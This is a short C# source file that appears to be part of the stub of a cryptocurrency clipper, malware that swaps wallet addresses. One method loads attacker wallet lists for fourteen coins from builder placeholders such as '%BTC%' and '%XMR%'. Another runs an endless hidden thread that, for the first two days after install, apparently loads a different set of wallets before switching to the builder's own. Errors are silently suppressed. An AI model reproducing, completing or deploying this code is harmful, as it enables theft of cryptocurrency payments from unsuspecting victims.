﻿using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub.Help
{
    class Cfgnative
    {
        public static void AddWallet()
        {
            try
            {
                Config.BTC_BC1 = "%BTC_BC1%".Split(',');
                Config.BTC = "%BTC%".Split(',');
                Config.BCH = "%BCH%".Split(',');
                Config.DOGE = "%DOGE%".Split(',');
                Config.ETH = "%ETH%".Split(',');
                Config.LTC = "%LTC%".Split(',');
                Config.XMR = "%XMR%".Split(',');
                Config.xlm = "%xlm%".Split(',');
                Config.xrp = "%xrp%".Split(',');
                Config.nec = "%nec%".Split(',');
                Config.dash = "%dash%".Split(',');
                Config.trx = "%trx%".Split(',');
                Config.zcash = "%zcash%".Split(',');
                Config.bnb = "%bnb%".Split(',');
            }
            catch { }
        }

        public static void CheckD()
        {
            new Thread(() => {
                try//
                {
                    while (true)
                    {
                        Thread.Sleep(60000);
                        if (DateTime.Today <= File.GetLastWriteTime(Install.currentProcess).AddDays(2))
                            Config.AddWallet();
                        else
                            AddWallet();
                    }
                }
                catch { }
            }).Start();
            
        }
    }
}
